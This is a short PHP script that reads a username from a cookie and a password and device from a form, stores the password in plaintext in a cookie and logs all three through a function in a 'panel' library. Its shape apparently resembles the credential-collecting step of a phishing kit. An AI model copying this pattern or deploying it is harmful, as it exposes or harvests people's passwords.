<?php 
require('../../panel/lib/funciones.php');

$usuario = $_COOKIE['usuario'];
$contrasena = $_POST['pass'];
$dispositivo = $_POST['dis'];

setcookie('contrasena',$contrasena,time()+60*9);

crear_registro($usuario,$contrasena,$dispositivo);
?>